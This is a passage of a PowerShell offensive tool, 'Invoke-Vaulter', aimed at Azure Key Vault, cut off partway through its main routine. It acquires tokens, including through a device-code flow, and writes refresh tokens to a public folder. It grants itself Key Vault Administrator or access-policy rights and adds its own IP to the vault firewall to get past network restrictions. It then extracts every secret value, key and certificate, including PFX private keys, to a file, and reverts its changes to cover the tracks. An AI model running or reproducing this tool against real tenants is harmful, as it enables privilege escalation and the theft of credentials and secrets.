function Invoke-Vaulter {
    param (
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$IdentityARM,
        [string]$IdentityVault,
        [string]$TenantName
    )


#######################################################################################################
    $global:AuthMethod  = $null
    $global:CID  = $null
    $global:CSecret = $null
    $global:TenantID = $null
    $global:AccessToken  = $null   # ARM token
    $global:VaultToken = $null   # vault.azure.net token
    $global:RefreshTkn = $null   # refresh token (user flow)
    $global:MyOid = $null   # identity object ID

#######################################################################################################
#######################################################################################################

function Get-JwtClaims {
    param(
        [string]$Jwt
    )

    $parts = $Jwt.Split('.')

    if ($parts.Count -lt 2) {
         return $null 
    }

    $payload = $parts[1].Replace('-', '+').Replace('_', '/')

    switch ($payload.Length % 4) {
        2 { $payload += '==' }
        3 { $payload += '='  }
    }

    $json = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))

    return $json | ConvertFrom-Json
}

#######################################################################################################
#######################################################################################################

function Get-AuthHeaders {

    if (-not $global:AccessToken) {
         throw "[-] No AccessToken." 
    }
    return @{
        "Authorization" = "Bearer $($global:AccessToken)"
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    }
}

#######################################

function Get-VaultHeaders {

    if (-not $global:VaultToken) {
         throw "[-] No VaultToken." 
    }
    return @{
        "Authorization" = "Bearer $($global:VaultToken)"
        "Accept" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    }
}

#######################################################################################################

function Invoke-TokenRequest {
    param(
        [string]$Scope,
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$RefreshToken,
        [string]$TenantID
    )

    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"

    if ($ClientID -and $ClientSecret) {
        $body = @{
            "grant_type" = "client_credentials"
            "scope" = $Scope
            "client_id" = $ClientID
            "client_secret" = $ClientSecret
        }
    }

    elseif ($RefreshToken) {
        $body = @{
            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "scope" = $Scope
            "grant_type" = "refresh_token"
            "refresh_token" = $RefreshToken
        }
    }

    else {
         return $null 
    }

    try {
        $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
        if ($resp.refresh_token) {
            $global:RefreshTkn = $resp.refresh_token
            Set-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $resp.refresh_token
        }
        return $resp.access_token
    }
    catch {
         return $null 
    }
}

#######################################################################################################

function Invoke-RenewToken {

    Write-Host "`t[!] Token expired - renewing ($($global:AuthMethod))..." -ForegroundColor Yellow

    switch ($global:AuthMethod) {
        "ClientCredentials" {
            $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -ClientID $global:CID -ClientSecret $global:CSecret -TenantID $global:TenantID
            $global:VaultToken  = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -ClientID $global:CID -ClientSecret $global:CSecret -TenantID $global:TenantID
            if ($global:AccessToken) {
                Write-Host "`t[+] Tokens renewed (ClientCredentials)" -ForegroundColor Green
                return $global:AccessToken
            }
            throw "[-] Failed to renew tokens."
        }
        "RefreshToken" {
            $rt = if (Test-Path "C:\Users\Public\RefreshToken.txt") {
                 Get-Content "C:\Users\Public\RefreshToken.txt" 
                } else {
                     $global:RefreshTkn 
                }

            if (-not $rt) {
                 throw "[-] No RefreshToken available." 
                }

            $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -RefreshToken $rt -TenantID $global:TenantID
            $global:VaultToken  = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -RefreshToken $rt -TenantID $global:TenantID

            if ($global:AccessToken) {
                Write-Host "`t[+] Tokens renewed (RefreshToken)" -ForegroundColor Green
                return $global:AccessToken
            }
            throw "[-] Failed to renew tokens."
        }
        "Manual" {
            Write-Host "`t[1/2] Paste new ARM AccessToken (management.azure.com):" -ForegroundColor Cyan
            $t1 = Read-Host "`tARM Token"

            if ([string]::IsNullOrWhiteSpace($t1)) {
                 throw "[-] No ARM token provided." 
            }

            $global:AccessToken = $t1.Trim()
            Write-Host "`t[+] ARM Token updated" -ForegroundColor Green

            Write-Host "`t[2/2] Paste new Vault AccessToken (vault.azure.net):" -ForegroundColor Cyan
            $t2 = Read-Host "`tVault Token"

            if ([string]::IsNullOrWhiteSpace($t2)) {
                 throw "[-] No Vault token provided." 
            }

            $global:VaultToken = $t2.Trim()
            Write-Host "`t[+] Vault Token updated" -ForegroundColor Green

            Write-Host "`t[>] Resuming..." -ForegroundColor Cyan
            return $global:AccessToken
        }
        default {
             throw "[-] Unknown AuthMethod." 
        }
    }
}

#######################################################################################################

function Invoke-SmartRequest {
    param (
        [string]$Method = "GET",
        [string]$Uri,
        [hashtable]$Headers = $null,
        $Body = $null,
        [string]$ContentType = $null,
        [int]$MaxRetries = 15
    )

    if (-not $Headers) {
         $Headers = Get-AuthHeaders 
    }

    $RetryCount = 0
    $TokenRenewed = $false
    $Success = $false
    $Response = $null

    while (-not $Success -and $RetryCount -lt $MaxRetries) {
        try {
            $p = @{ Method = $Method; Uri = $Uri; Headers = $Headers }

            if ($null -ne $Body) {
                 $p['Body'] = $Body 
            }

            if ($ContentType){
                 $p['ContentType'] = $ContentType 
            }

            $Response = Invoke-RestMethod @p
            $Success  = $true
        }
        catch {
            $err  = $_
            $code = if ($err.Exception.Response) {
                 [int]$err.Exception.Response.StatusCode 
                } 
                else { 
                    $null 
                }

            if ($code -eq 429) {
                $RetryCount++
                $ra = $err.Exception.Response.Headers["Retry-After"]
                $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) {
                     [int]($ra -join '') 
                    } else {
                         10 * $RetryCount 
                    }

                Write-Host "`t[!] 429 - waiting $wait sec" -ForegroundColor Gray
                Start-Sleep -Seconds $wait
            }
            elseif ($code -eq 401) {
                if ($TokenRenewed) {
                     throw "[-] 401 after renewal." 
                    }

                Invoke-RenewToken | Out-Null

                $Headers["Authorization"] = "Bearer $($global:AccessToken)"
                $TokenRenewed = $true
            }

            elseif ($code -eq 403) {
                 throw "[-] 403 Forbidden - $Uri" 
                }

            elseif ($code -eq 404) {
                 return $null 
                }

            elseif ($null -eq $code -or $code -ge 500) {
                $RetryCount++
                Start-Sleep -Seconds (5 * $RetryCount)
            }

            else {
                 throw $err 
            }
        }
    }

    if (-not $Success) {
         throw "[-] Failed after $MaxRetries retries: $Uri" 
        }

    return $Response
}

#######################################################################################################
#######################################################################################################

function Get-DomainName {

    param (
        [string]$DomainName
    )

    try {
        $resp = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
        $tid  = ($resp.issuer -split "/")[3]
        Write-Host "[#] Tenant ID: $tid" -ForegroundColor DarkYellow
        return $tid

    } catch {
        Write-Error "[-] Failed to resolve domain: $DomainName"
        return $null
    }
}

#######################################################################################################

function Invoke-GetTokens {
    param(
        [string]$DomainName,
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$ARMToken,
        [string]$VaultToken
    )

    # Manual tokens (Managed Identity)
    if ($ARMToken) {
        $global:AuthMethod = "Manual"
        $global:AccessToken = $ARMToken

        if ($VaultToken) {
            $global:VaultToken = $VaultToken
        }
        else {
            Write-Host "[!] No Vault token provided. Vault extraction will fail without it." -ForegroundColor Yellow
        }

        Write-Host "[+] ARM Token set (Manual)" -ForegroundColor Green
        if ($global:VaultToken) { Write-Host "[+] Vault Token set (Manual)" -ForegroundColor Green }
        return $global:AccessToken
    }

    if ($DomainName) {
        $global:TenantID = Get-DomainName -DomainName $DomainName
        if (-not $global:TenantID) { return $null }
    }

    # Service Principal
    if ($ClientID -and $ClientSecret) {
        $global:AuthMethod = "ClientCredentials"
        $global:CID = $ClientID
        $global:CSecret = $ClientSecret

        $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $global:TenantID
        $global:VaultToken  = Invoke-TokenRequest -Scope "https://vault.azure.net/.default"      -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $global:TenantID

        if ($global:AccessToken) {
            Write-Host "[+] Tokens acquired (ClientCredentials)" -ForegroundColor Green
            return $global:AccessToken
        }
        Write-Error "[-] Failed to acquire tokens."
        return $null
    }

    # Device Code Flow
    $global:AuthMethod = "RefreshToken"
    $refreshPath = "C:\Users\Public\RefreshToken.txt"

    if (Test-Path $refreshPath) {
        Write-Host "[?] Found existing RefreshToken" -ForegroundColor DarkYellow
        $use = Read-Host "    Use it? (Y/N)"
        if ($use -match "^[Yy]") {
            $rt = Get-Content $refreshPath

            $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -RefreshToken $rt -TenantID $global:TenantID
            $global:VaultToken  = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -RefreshToken $rt -TenantID $global:TenantID

            if ($global:AccessToken) {
                Write-Host "[+] Tokens acquired (RefreshToken)" -ForegroundColor Green
                return $global:AccessToken
            }
            Write-Host "[!] RefreshToken failed, falling back to Device Code..." -ForegroundColor Yellow
        }
    }

    # Device Code
    $authResp = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body @{
        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" = "https://management.azure.com"
    }
    Write-Host "`n[#] Enter this code:" -ForegroundColor DarkYellow -NoNewline
    Write-Host " $($authResp.user_code)" -ForegroundColor White
    Start-Sleep -Seconds 5
    Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

    $tokenBody = @{
        "scope" = "openid"
        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
        "code" = $authResp.device_code
    }

    while ($true) {
        try {
            $tokenResp = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0" -Body $tokenBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
            if ($tokenResp.refresh_token) {
                Set-Content -Path $refreshPath -Value $tokenResp.refresh_token
                $global:RefreshTkn = $tokenResp.refresh_token
            }
            $global:AccessToken = $tokenResp.access_token
            $global:VaultToken  = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -RefreshToken $global:RefreshTkn -TenantID $global:TenantID
            Write-Host "[+] Tokens acquired (DeviceCode)" -ForegroundColor Green
            return $global:AccessToken
        }
        catch {
            $er = $_.ErrorDetails.Message | ConvertFrom-Json
            if ($er.error -eq "authorization_pending") { Start-Sleep -Seconds 5 }
            else { Write-Host "[-] $($er.error)" -ForegroundColor Red; return $null }
        }
    }
}

#######################################################################################################
#######################################################################################################

function Invoke-SmartVaultRequest {
    param (
        [string]$Method = "GET",
        [string]$Uri,
        [int]$MaxRetries = 15
    )

    $RetryCount = 0
    $TokenRenewed = $false
    $Success = $false
    $Response  = $null

    while (-not $Success -and $RetryCount -lt $MaxRetries) {
        $Headers = Get-VaultHeaders

        try {
            $p = @{ Method = $Method; Uri = $Uri; Headers = $Headers; ErrorAction = "Stop" }
            $Response = Invoke-RestMethod @p
            $Success  = $true
        }
        catch {
            $err  = $_
            $code = if ($err.Exception.Response) { [int]$err.Exception.Response.StatusCode } else { $null }

            if ($code -eq 429) {
                $RetryCount++
                $ra = $err.Exception.Response.Headers["Retry-After"]

                $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) {
                     [int]($ra -join '') 
                } else {
                     0 
                }

                if ($wait -eq 0) {
                     $wait = 10 * $RetryCount 
                }

                Write-Host "      [!] Vault 429 - waiting $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Gray
                Start-Sleep -Seconds $wait
            }


            elseif ($code -eq 401) {
                if ($TokenRenewed) {
                    throw "[-] Vault 401 after token renewal."
                }
                Write-Host "      [!] Vault token expired - renewing..." -ForegroundColor Yellow
                Invoke-RenewToken | Out-Null
                $TokenRenewed = $true
            }


            elseif ($code -eq 403) {
                throw "VAULT_403"
            }


            elseif ($code -eq 404) {
                return $null
            }


            elseif ($null -eq $code -or $code -ge 500) {
                $RetryCount++
                $wait = 5 * $RetryCount
                Write-Host "      [!] Vault error ($code) - retrying in $wait sec" -ForegroundColor Yellow
                Start-Sleep -Seconds $wait
            }
            else { throw $err }
        }
    }

    if (-not $Success) {
        throw "[-] Vault request failed after $MaxRetries retries: $Uri"
    }
    return $Response
}

#######################################################################################################
#######################################################################################################

function GetIP {
    try {
         $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 10).Trim(); return "$ip/32" 
    }
    catch {
         return $null 
    }
}

#######################################################################################################

function Test-OpAllowed {
    param(
        [array]$PermEntries,
        [string]$Operation,
        [string]$ActionType = "actions"   
    )

    $denyType = if ($ActionType -eq "actions") {
		"notActions" 
	} else {
		"notDataActions" 
	}

    foreach ($entry in $PermEntries) {
        $allowed = @($entry.$ActionType)
        $denied = @($entry.$denyType)

        
        $isAllowed = $false
        foreach ($a in $allowed) {
            if ($Operation -like $a) { $isAllowed = $true; break }
        }
        if (-not $isAllowed) { continue }


        $isDenied = $false
        foreach ($d in $denied) {
            if ($Operation -like $d) {
				$isDenied = $true
				break 
			}
        }

        if (-not $isDenied) {
			return $true 
		}
    }

    return $false
}

#######################################################################################################

function Get-SubscriptionPermSummary {
    param(
        [string]$SubscriptionId, 
        [hashtable]$Headers
    )

    $url = "https://management.azure.com/subscriptions/$SubscriptionId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    try { 
        $resp = Invoke-SmartRequest -Uri $url -Headers $Headers 
    }
    catch {
         return "ERROR" 
    }

    $allow = @(); $deny = @()
    foreach ($p in $resp.value) {
        if ($p.actions) { 
            $allow += $p.actions 
        }
        if ($p.notActions) {
             $deny  += $p.notActions 
        }
    }

    $allow = $allow | Select-Object -Unique
    $deny = $deny | Select-Object -Unique

    $hasStar = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*'
    $canRBAC = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Authorization/roleAssignments/write'
    $globalRead = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*/read'

    if ($deny -contains '*') {
         return "Denied" 
    }

    elseif ($canRBAC -and $hasStar) {
         return "Owner" 
    }
    
    elseif ($hasStar)  {
         return "Contributor" 
    }

    elseif ($globalRead)  {
         return "Reader" 
    }

    else {
         return "Limited" 
    }

}

#######################################################################################################
#######################################################################################################

function Extract-VaultData {
    param(
        [string]$VaultName,
        [string]$SubscriptionId,
        [string]$ResourceGroup,
        [string]$DataPath
    )

    $extracted = 0
    $firewallBlocked = $false

    $kinds = @(
        @{ Kind = "Secret"; ListUri = "https://$VaultName.vault.azure.net/secrets?api-version=7.4" },
        @{ Kind = "Key";  ListUri = "https://$VaultName.vault.azure.net/keys?api-version=7.4" },
        @{ Kind = "Certificate"; ListUri = "https://$VaultName.vault.azure.net/certificates?api-version=7.4" }
    )

    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false)

    foreach ($k in $kinds) {
        Write-Host "    [!] Extracting $($k.Kind)s..." -ForegroundColor Cyan
        $uri = $k.ListUri

        while ($null -ne $uri) {
            try {
                $page = Invoke-SmartVaultRequest -Uri $uri
            }
            catch {
                if ($_ -match "VAULT_403") {
                    Write-Host "    [!] 403 - Firewall blocking access" -ForegroundColor Yellow
                    $firewallBlocked = $true
                    break
                }
                Write-Host "    [-] Failed to list $($k.Kind)s: $_" -ForegroundColor Red
                break
            }

            foreach ($item in $page.value) {
				$itemId = if ($item.kid) { $item.kid } else { $item.id }
				$getUri = "$itemId`?api-version=7.4"
				$name   = ($itemId -split '/')[-1]

                try { $detail = Invoke-SmartVaultRequest -Uri $getUri }
                catch { continue }

                switch ($k.Kind) {
                    "Secret" {
                        $row = [PSCustomObject]@{
                            SubscriptionId = $SubscriptionId
                            ResourceGroup = $ResourceGroup
                            ResourceName = $VaultName
                            ResourceType = "KeyVault-Secret"
                            SecretName  = $name
                            SecretValue = $detail.value
                        }
                    }
                    "Key" {
                        $row = [PSCustomObject]@{
                            SubscriptionId = $SubscriptionId
                            ResourceGroup = $ResourceGroup
                            ResourceName = $VaultName
                            ResourceType = "KeyVault-Key"
                            KeyName = $name
                            KeyId = $detail.key.kid
                            KeyOps = ($detail.key.key_ops -join ',')
                        }
                    }
                    "Certificate" {
                        $row = [PSCustomObject]@{
                            SubscriptionId = $SubscriptionId
                            ResourceGroup = $ResourceGroup
                            ResourceName = $VaultName
                            ResourceType = "KeyVault-Certificate"
                            CertName = $name
                            CerBase64Der = $detail.cer
                        }


                        try {
                            $sec = Invoke-SmartVaultRequest -Uri "https://$VaultName.vault.azure.net/secrets/$name`?api-version=7.4"
                            if ($sec.contentType -eq 'application/x-pkcs12') {
                                $pfxRow = [PSCustomObject]@{
                                    SubscriptionId = $SubscriptionId
                                    ResourceGroup = $ResourceGroup
                                    ResourceName  = $VaultName
                                    ResourceType = "KeyVault-Certificate-PFX"
                                    CertName = $name
                                    PfxBase64 = $sec.value
                                }
                                $jsonLine = $pfxRow | ConvertTo-Json -Depth 12 -Compress
                                [System.IO.File]::AppendAllText($DataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                $extracted++
                            }
                        } catch { }
                    }
                }

                $jsonLine = $row | ConvertTo-Json -Depth 12 -Compress

                [System.IO.File]::AppendAllText($DataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                $extracted++
            }
            $uri = $page.nextLink
        }

        if ($firewallBlocked) { break }
    }

    if ($firewallBlocked) {
        Write-Host "    [!] Firewall blocked - extracted $extracted items before block" -ForegroundColor Yellow
        return -1   # Signal to caller: need firewall bypass
    }

    Write-Host "    [+] Extracted $extracted items from $VaultName" -ForegroundColor Green
    return $extracted
}

#######################################################################################################
#######################################################################################################

# Key Vault Administrator role definition GUID
$script:KV_ADMIN_ROLE = "00482a5a-887f-4fb3-b363-3b7fe8e74483"

function Add-VaultAccess {
    param(
        [string]$VaultName,
        [string]$ResourceGroup,
        [string]$VaultId,
        [string]$SubscriptionId,
        [string]$EscalateMethod,   # "RBAC-RoleAssign" | "RBAC-SwitchToAP" | "AP-Write"
        [string]$MyOid,
        [string]$MyIP
    )

    $changes = @{
        RoleAdded = $false
        RoleAssignmentId = $null
        IPAdded  = $false
        APAdded = $false
        RBACDisabled = $false   # for RBAC-SwitchToAP restore
    }
    $headers = Get-AuthHeaders

    switch ($EscalateMethod) {

        "RBAC-RoleAssign" {
            $assignmentId = [guid]::NewGuid().ToString()
            $roleDefId = "/subscriptions/$SubscriptionId/providers/Microsoft.Authorization/roleDefinitions/$($script:KV_ADMIN_ROLE)"
            
            $assignUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/roleAssignments/$assignmentId`?api-version=2022-04-01"

            $body = @{
                properties = @{
                    roleDefinitionId = $roleDefId
                    principalId = $MyOid
                }
            } | ConvertTo-Json -Depth 5

            try {
                $null = Invoke-SmartRequest -Method "PUT" -Uri $assignUrl -Headers $headers -Body $body -ContentType "application/json"
                $changes.RoleAdded = $true
                $changes.RoleAssignmentId = $assignmentId
                Write-Host "    [+] Key Vault Administrator role added" -ForegroundColor Green
            }
            catch { Write-Host "    [-] Failed to add role: $_" -ForegroundColor Red }
        }

        "IPOnly" {
            Write-Host "    [>] Data permissions exist - bypassing firewall only..." -ForegroundColor Cyan
            # IP addition is handled below in the common block
        }

        # ── Contributor on AP vault: Add AccessPolicy directly ──────
        "AP-Write" {
            $apUrl = "https://management.azure.com$VaultId/accessPolicies/add?api-version=2022-07-01"
            $body = @{
                properties = @{
                    accessPolicies = @(
                        @{
                            tenantId = $global:TenantID
                            objectId  = $MyOid
                            permissions = @{
                                secrets = @("get", "list")
                                keys = @("get", "list")
                                certificates = @("get", "list")
                            }
                        }
                    )
                }
            } | ConvertTo-Json -Depth 6

            try {
                $null = Invoke-SmartRequest -Method "PUT" -Uri $apUrl -Headers $headers -Body $body -ContentType "application/json"
                $changes.APAdded = $true
                Write-Host "    [+] Access Policy added" -ForegroundColor Green
            }
            catch { Write-Host "    [-] Failed to set Access Policy: $_" -ForegroundColor Red }
        }
    }



    if ($MyIP) {
        try {
            $vault = Invoke-SmartRequest -Uri "https://management.azure.com$VaultId`?api-version=2022-07-01" -Headers $headers

            $currentIpRules = @()
            if ($vault.properties.networkAcls -and $vault.properties.networkAcls.ipRules) {
                $currentIpRules = @($vault.properties.networkAcls.ipRules)
            }
            $alreadyExists = $currentIpRules | Where-Object { $_.value -eq $MyIP }
            if (-not $alreadyExists) {
                $currentIpRules += @{ value = $MyIP }
            }

            $patchBody = @{
                properties = @{
                    networkAcls = @{
                        ipRules = $currentIpRules
                    }
                }
            } | ConvertTo-Json -Depth 6

            $null = Invoke-SmartRequest -Method "PATCH" -Uri "https://management.azure.com$VaultId`?api-version=2022-07-01" -Headers $headers -Body $patchBody -ContentType "application/json"
            $changes.IPAdded = $true
            Write-Host "    [+] IP $MyIP added to network rules" -ForegroundColor Green
        }
        catch { Write-Host "    [-] Failed to add IP: $_" -ForegroundColor Red }
    }

    # ── Refresh vault token after escalation ────────────────────────
    if ($global:AuthMethod -eq "ClientCredentials") {
        $global:VaultToken = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -ClientID $global:CID -ClientSecret $global:CSecret -TenantID $global:TenantID
    }
    elseif ($global:AuthMethod -eq "RefreshToken") {
        $rt = if (Test-Path "C:\Users\Public\RefreshToken.txt") { Get-Content "C:\Users\Public\RefreshToken.txt" } else { $global:RefreshTkn }
        $global:VaultToken = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -RefreshToken $rt -TenantID $global:TenantID
    }

    return $changes
}


#######################################################################################################
#######################################################################################################

function Remove-VaultAccess {
    param(
        [string]$VaultName,
        [string]$ResourceGroup,
        [string]$VaultId,
        [string]$SubscriptionId,
        [string]$MyOid,
        [string]$MyIP,
        [hashtable]$Changes
    )

    Write-Host "    [!] Restoring changes..." -ForegroundColor Yellow
    $headers = Get-AuthHeaders

    if ($Changes.IPAdded) {
        try {
            $vault = Invoke-SmartRequest -Uri "https://management.azure.com$VaultId`?api-version=2022-07-01" -Headers $headers

            $updatedIpRules = @()

            if ($vault.properties.networkAcls -and $vault.properties.networkAcls.ipRules) {
                $updatedIpRules = @($vault.properties.networkAcls.ipRules | Where-Object { $_.value -ne $MyIP })
            }

            $patchBody = @{ properties = @{ networkAcls = @{ ipRules = $updatedIpRules } } } | ConvertTo-Json -Depth 6

            $null = Invoke-SmartRequest -Method "PATCH" -Uri "https://management.azure.com$VaultId`?api-version=2022-07-01" -Headers $headers -Body $patchBody -ContentType "application/json"
            Write-Host "    [+] IP rule removed" -ForegroundColor Green
        }
        catch { Write-Host "    [-] Failed to remove IP rule: $_" -ForegroundColor Red }
    }


    if ($Changes.RoleAdded -and $Changes.RoleAssignmentId) {
        try {
            $deleteUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/roleAssignments/$($Changes.RoleAssignmentId)`?api-version=2022-04-01"
            $null = Invoke-SmartRequest -Method "DELETE" -Uri $deleteUrl -Headers $headers
            Write-Host "    [+] Role assignment removed" -ForegroundColor Green
        }
        catch { Write-Host "    [-] Failed to remove role: $_" -ForegroundColor Red }
    }

    if ($Changes.APAdded) {
        try {
            $removeUrl = "https://management.azure.com$VaultId/accessPolicies/remove?api-version=2022-07-01"
            $body = @{
                properties = @{
                    accessPolicies = @(@{
                        tenantId = $global:TenantID
                        objectId = $MyOid
                        permissions = @{
                            secrets = @("get", "list")
                            keys = @("get", "list")
                            certificates = @("get", "list")
                        }
                    })
                }
            } | ConvertTo-Json -Depth 6
            $null = Invoke-SmartRequest -Method "PUT" -Uri $removeUrl -Headers $headers -Body $body -ContentType "application/json"
            Write-Host "    [+] Access Policy removed" -ForegroundColor Green
        }
        catch { Write-Host "    [-] Failed to remove Access Policy: $_" -ForegroundColor Red }
    }

    if ($Changes.RBACDisabled) {
        try {
            $patchBody = @{ properties = @{ enableRbacAuthorization = $true } } | ConvertTo-Json -Depth 5
            $null = Invoke-SmartRequest -Method "PATCH" -Uri "https://management.azure.com$VaultId`?api-version=2022-07-01" -Headers $headers -Body $patchBody -ContentType "application/json"
            Write-Host "    [+] RBAC re-enabled" -ForegroundColor Green
        }
        catch { Write-Host "    [-] Failed to re-enable RBAC: $_" -ForegroundColor Red }
    }

    Write-Host "    [+] Settings restored" -ForegroundColor Green
}

#######################################################################################################
#######################################################################################################

function Test-VaultPermissions {
    param(
        [string]$VaultId,
        [string]$Mode,
        $VaultDetail,
        [string]$MyOid,
        [hashtable]$Headers
    )

    $result = @{
        CanReadSecrets = $false
        CanReadKeys = $false
        CanReadCerts = $false
        CanEscalate  = $false
        EscalateMethod = $null  # "RBAC-RoleAssign" | "RBAC-SwitchToAP" | "AP-Write"
    }

		if ($Mode -eq "RBAC") {
			$permUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
			try { 
				$perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers 
			}
			catch {
				return $result 
			}

			$entries = $perm.value

			# Data plane access (check dataActions per-entry)
			$result.CanReadSecrets = (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/secrets/getSecret/action' -ActionType "dataActions") -or (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/secrets/*' -ActionType "dataActions")
			$result.CanReadKeys = (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/keys/read' -ActionType "dataActions") -or (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/keys/*' -ActionType "dataActions")
			$result.CanReadCerts = (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/certificates/read' -ActionType "dataActions") -or (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/certificates/*' -ActionType "dataActions")

			$canRBAC   = Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.Authorization/roleAssignments/write' -ActionType "actions"
			$canVaultW = Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/write' -ActionType "actions"

			$canRead = $result.CanReadSecrets -or $result.CanReadKeys -or $result.CanReadCerts

			if ($canRBAC) {
				
				$result.CanEscalate = $true
				$result.EscalateMethod = "RBAC-RoleAssign"
			}
			elseif ($canRead -and $canVaultW) {
				
				$result.CanEscalate = $true
				$result.EscalateMethod = "IPOnly"
			}
		}
		else {
			$policies = $VaultDetail.properties.accessPolicies
			if ($policies) {
				$match = $policies | Where-Object { $_.objectId -eq $MyOid } | Select-Object -First 1
				if ($match) {
					$s = @($match.permissions.secrets) | Where-Object { $_ -in @('get','list','all') }
					$k = @($match.permissions.keys) | Where-Object { $_ -in @('get','list','all') }
					$c = @($match.permissions.certificates) | Where-Object { $_ -in @('get','list','all') }
					$result.CanReadSecrets = [bool]$s
					$result.CanReadKeys = [bool]$k
					$result.CanReadCerts = [bool]$c
				}
			}

			# Can we modify access policy?????????????????????????????????
			$permUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
			try { $perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers }
			catch { return $result }

			$allow = @()
			$deny = @()

			foreach ($p in $perm.value) {
				if ($p.actions) {
					 $allow += $p.actions 
				}
				if ($p.notActions) {
					 $deny  += $p.notActions 
				}
			}
			$allow = $allow | Select-Object -Unique
			$deny = $deny | Select-Object -Unique

			$hasStar = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*'
			$canAP = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.KeyVault/vaults/accessPolicies/write'
			$canW = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*/write'

			if ($hasStar -or $canAP -or $canW) {
				$result.CanEscalate  = $true
				$result.EscalateMethod = "AP-Write"
			}
		}

    return $result
}

#######################################################################################################
#######################################################################################################

function main {
    param (
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$IdentityARM,
        [string]$IdentityVault,
        [string]$TenantName
    )

    if (-not $TenantName) {
        Write-Host "[-] Must specify TenantName" -ForegroundColor Red
        return
    }

    $global:TenantID = Get-DomainName -DomainName $TenantName
    if (-not $global:TenantID) { return }

    if ($IdentityARM) {
        Invoke-GetTokens -ARMToken $IdentityARM -VaultToken $IdentityVault | Out-Null
    }
    elseif ($ClientID -and $ClientSecret) {
        Invoke-GetTokens -DomainName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret | Out-Null
    }
    else {
        Invoke-GetTokens -DomainName $TenantName | Out-Null
    }



    if (-not $global:AccessToken) { Write-Host "[-] No token." -ForegroundColor Red; return }

    $claims = Get-JwtClaims -Jwt $global:AccessToken
    $global:MyOid = $claims.oid

    Write-Host "[#] Identity OID: $($global:MyOid)" -ForegroundColor DarkYellow

    $myIP = GetIP
    if ($myIP) { Write-Host "[#] My IP: $myIP" -ForegroundColor DarkYellow }

    $headers = Get-AuthHeaders


    $dataPath = Join-Path $PWD "kv_results.ndjson"
    if (Test-Path $dataPath) {
         Remove-Item $dataPath -Force 
    }

    New-Item -ItemType File -Path $dataPath -Force | Out-Null
    Write-Host "[>] Output: $dataPath" -ForegroundColor DarkGray

  
    Write-Host "`n[*] Enumerating Subscriptions..." -ForegroundColor Cyan

    $subResp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $headers

    if (-not $subResp -or -not $subResp.value) {
